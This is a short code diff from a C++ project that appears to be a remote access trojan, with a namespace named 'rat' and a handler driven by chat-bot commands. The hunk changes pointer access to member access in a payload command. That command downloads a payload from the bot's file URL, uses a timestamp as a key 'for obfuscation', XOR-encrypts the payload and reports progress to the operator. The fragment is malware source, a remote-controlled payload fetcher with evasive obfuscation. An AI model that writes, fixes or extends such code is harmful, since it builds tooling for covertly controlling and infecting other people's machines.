@@ -58,22 +58,22 @@ void Handler::handlePayloadCommand() {
     }
 
     // Store key for obfuscation
-    this->state->payload_key = time_stamp;
+    this->state.payload_key = time_stamp;
 
     // Construct file URL (adjust depending on your bot API)
     const std::string file_url = fmt::format("{}{}", this->bot->getBotFileUrl(), file_id);
     this->bot->sendMessage("Downloading the Payload...");
-    if (!this->bot->curl_client.downloadData(file_url, this->state->payload)) {
+    if (!this->bot->curl_client.downloadData(file_url, this->state.payload)) {
         this->bot->sendMessage("Failed to download payload.");
         return;
     }
 
-    if (!this->state->payload.empty()) {
+    if (!this->state.payload.empty()) {
         this->bot->sendMessage("Obfuscating it...");
         rat::encryption::xorData(
-            this->state->payload.data(),
-            this->state->payload.size(),
-            this->state->payload_key.c_str()
+            this->state.payload.data(),
+            this->state.payload.size(),
+            this->state.payload_key.c_str()
         );
     } else {
         this->bot->sendMessage("Payload is empty after download.");
